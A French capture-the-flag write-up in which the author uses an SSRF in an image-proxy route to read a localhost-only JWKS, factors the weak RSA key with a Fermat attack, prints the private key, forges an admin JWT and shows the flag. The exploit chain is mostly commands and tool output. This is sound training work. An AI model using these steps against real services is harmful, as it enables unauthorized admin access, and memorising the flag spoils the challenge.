# The best i can do is 4

*Suite à leur flop dans le monde de la crypto, Emudhra a décidé de se lancer dans la vente de tondeuses. Mais leurs mauvaises habitudes n'ont-elles pas repris le dessus ?*

---

## Rappel : JWT, RS256 et JWKS

L'appli gère les sessions avec un JWT, un jeton contenant les informations de l'utilisateur. Ce JWT est signé en RS256 (RSA asymétrique). La clé privée signe, la clé publique vérifie. Cette clé publique est publiée dans un JWKS (un JSON qui liste les clés) que l'appli va chercher pour valider la signature à chaque requête.

En conséquence de quoi passer `role` à `admin` casse la signature. Tout le challenge consiste à récupérer la clé privée pour forger une JWT admin. Pour plus d'info : https://jwt.io/introduction

## Write up

On constate qu'un commentaire a été laissé au début du fichier par un développeur peu vigilant et qui nous indique que le chemin "/jwk" est utilisé pour vérifier la signature des JWT qui servent pour identifier le rôle de l'utilisateur dans sa session :
```html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Emudhra post quantum Tondeuses</title>
  <!--
    CHANGELOG POUR L'ÉQUIPE :

    > 4 c'était solide putain, ça fait au moins 1.. 2.. 3.. et euhh et 4 possibilités.
    Enfin bon bref on a fait mieux pour notre /jwk et toute façon personne peu aller regarder la clé publique qui s'y trouve.
    
    #DEFENSE EN PROFONDEUR

  -->
```

Cette page n'est pas accessible "hors de localhost" selon le message d'erreur :
```
GET /jwk

Forbidden
forbidden: localhost only
```

Si on regarde le frontend de l'application on constate que les images sont chargées ainsi :
```html
<img loading="lazy" src="/get_tondeuse?url=http://127.0.0.1:8080/tondeuses_granting_service/la_classique.jpg" alt="La Classique">
```

Si la route "get_tondeuse" ne valide pas le chemin du tondeuses granting service on peut peut-être obtenir une SSRF <RAPPELLE CONTEXTE SSRF> et pourquoi pas lire le JWK !

```
GET /get_tondeuse?url=http://127.0.0.1:8080/jwk
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.15
Date: Fri, 23 Oct 2026 17:46:39 GMT
Content-Type: application/json
Content-Length: 178
Connection: close

{"keys":[{"alg":"RS256","e":"AQAB","kid":"tondeuse-rsa-1","kty":"RSA","n":"1n3uHYpdc03BN28gatNHInIiKnMgjPxjSiQouFhtcS0PcDgn_pKh61H9-i0DQrmMaw6m4cvLz1bwuG5Dmm7RxQ","use":"sig"}]}

```

ça fonctionne !

À partir de là il y a plusieurs choses à tester pour forger un JWT admin valide. Mais la plus évidente en lien avec le titre du challenge c'est de bruteforce la clé.

La première étape consiste à extraire convertir les données dans un format exploitable par RsaCtfTool (j'utilise https://gchq.github.io/CyberChef) :
```
n FROM base64 ("A-Za-z0-9-_" chars only) TO Hex = d67dee1d8a5d734dc1376f206ad3472272222a73208cfc634a2428b8586d712d0f703827fe92a1eb51fdfa2d0342b98c6b0ea6e1cbcbcf56f0b86e439a6ed1c5
+ "0x" le préfixe attendu par RsaCtfTool (au pire il te le dit en message d'erreur)

e FROM base64 TO Hex = 01 00 01

010001 FROM  Base radix=16 = 65537
```

(en l'occurrence même pas besoin de s'embêter à convertir `e` car AQAB est l'exposant standard de RSA et il vaut donc toujours 65537)

```
RsaCtfTool -n 0xd67dee1d8a5d734dc1376f206ad3472272222a73208cfc634a2428b8586d712d0f703827fe92a1eb51fdfa2d0342b98c6b0ea6e1cbcbcf56f0b86e439a6ed1c5 -e 65537 --attack fermat --private

[*] Testing key /tmp/tmpd6hwa5d8.
[*] Performing fermat attack on /tmp/tmpd6hwa5d8.
[*] Attack success with fermat method !

Results for /tmp/tmpd6hwa5d8:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIBPAIBAAJBANZ97h2KXXNNwTdvIGrTRyJyIipzIIz8Y0okKLhYbXEtD3A4J/6S
oetR/fotA0K5jGsOpuHLy89W8LhuQ5pu0cUCAwEAAQJBAK6BH+PquWLgxKzb/UzL
/Zi5sLBGoBn0ELe2OWbZkpi66gTV+9AkgKFnzA/uGWG99sip2FYovG6JzaayWeit
0oECIQDqVCRannygM0ie+5DF22bksrdCvev4P9PyIhmrYta5YQIhAOpUJFqefKAz
SJ77kMXbZuoA8YbpOyOp/CFQA/pf5b7lAiEAxfVhZODA/gF1F0IEsvHAAfJs2Uhj
AazCW6qtLtln9uECIGkuVZcbdqNOAbXjA4vcPKiivccp33LVtSeay/5Rl0WFAiEA
k78Sll9sCmqU+Q0Jq18CgCVc30fKTfVoZehUPcMPmnc=
-----END RSA PRIVATE KEY-----
```

Maintenant qu'on a la clé on peut forger notre propre JWT :
```
$ jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InRvbmRldXNlLXJzYS0xIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3OTI3ODE0OTQsImV4cCI6MTc5Mjc4NTA5NH0.JINeubeNYa_rlPlcjqR43hJKwJBYel10bb-0vsF6D_7ev9TNaxL5XQX90-sqVO9Q6Q-maIltKFc-YCShJNDa6w -T -S rs256 -pr priv.pem

Token header values:
[1] alg = "RS256"
[2] typ = "JWT"
[3] kid = "tondeuse-rsa-1"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = "guest"
[2] role = "guest"
[3] iat = 1792781494    ==> TIMESTAMP = 2026-10-23 20:51:34 (UTC)
[4] exp = 1792785094    ==> TIMESTAMP = 2026-10-23 21:51:34 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: guest
Please enter new value and hit ENTER
> admin
[1] user = "admin"
[2] role = "guest"
[3] iat = 1792781494    ==> TIMESTAMP = 2026-10-23 20:51:34 (UTC)
[4] exp = 1792785094    ==> TIMESTAMP = 2026-10-23 21:51:34 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of role is: guest
Please enter new value and hit ENTER
> admin
[1] user = "admin"
[2] role = "admin"
[3] iat = 1792781494    ==> TIMESTAMP = 2026-10-23 20:51:34 (UTC)
[4] exp = 1792785094    ==> TIMESTAMP = 2026-10-23 21:51:34 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_cb6f5b11f684394240f94f028a67a29f - Tampered token - RSA Signing:
[+] eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InRvbmRldXNlLXJzYS0xIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3OTI3ODE0OTQsImV4cCI6MTc5Mjc4NTA5NH0.keIwRbKeaEF4BvgUaHzsMMVMnf_SXm9drcOiGR8SryJxlgAwmVqgWN49SVaGGRGmsBY8FYAatjnAiXraROveAQ
```

```
GET /admin HTTP/1.1
[...]
token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InRvbmRldXNlLXJzYS0xIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3OTI3ODE0OTQsImV4cCI6MTc5Mjc4NTA5NH0.keIwRbKeaEF4BvgUaHzsMMVMnf_SXm9drcOiGR8SryJxlgAwmVqgWN49SVaGGRGmsBY8FYAatjnAiXraROveAQ

{
    "flag":"CYBN{PouRtAnt_Je_lai_b1en_sEcurisE_aVEc_le_cadeNAS}",
    "message":"Bienvenue admin."
}
```
